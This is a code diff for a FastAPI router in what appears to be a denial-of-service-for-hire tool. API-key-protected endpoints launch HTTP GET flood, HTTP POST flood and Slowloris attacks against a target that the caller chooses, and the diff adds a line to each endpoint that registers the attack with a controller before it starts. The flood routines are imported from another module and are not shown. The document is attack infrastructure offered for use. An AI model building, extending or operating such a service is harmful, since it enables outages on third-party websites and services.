@@ -2,6 +2,7 @@ import json
 from fastapi import APIRouter, Depends, Request, Response
 from src.attack import Attack
 from src.auth import verify_api_key
+from src.controllers.attack_controller import attack_controller
 from src.denialofservice.layer7 import Layer7
 from src.log import log
 from src.schemas import HttpGetFloodRequest, HttpPostFloodRequest, SlowlorisFloodRequest
@@ -15,6 +16,7 @@ async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request, api_k
         api_key = request.headers.get("api-key")
         attack = Attack("Layer 7", "HTTP-GET-Flood", Layer7.http_get_flood,
                         api_key, json.loads(get_flood.json()))
+        attack_controller.add_attack(attack)
         attack.start()
         log.info(
             f"{get_flood.target} HTTP-GET-FLooded from {request.client.host} for {get_flood.time} seconds")
@@ -31,6 +33,7 @@ async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request, ap
         api_key = request.headers.get("api-key")
         attack = Attack("Layer 7", "HTTP-POST-Flood",
                         Layer7.http_post_flood, api_key, json.loads(post_flood.json()))
+        attack_controller.add_attack(attack)
         attack.start()
         log.info(
             f"{post_flood.target} HTTP-POST-FLooded from {request.client.host} for {post_flood.time} seconds")
@@ -47,6 +50,7 @@ async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request, api_ke
         api_key = request.headers.get("api-key")
         attack = Attack("Layer 7", "SlowLoris", Layer7.slow_loris,
                         api_key, json.loads(slow_loris.json()))
+        attack_controller.add_attack(attack)
         attack.start()
         log.info(
             f"{slow_loris.target} SLOW-Loris from {request.client.host} for {slow_loris.time} seconds")
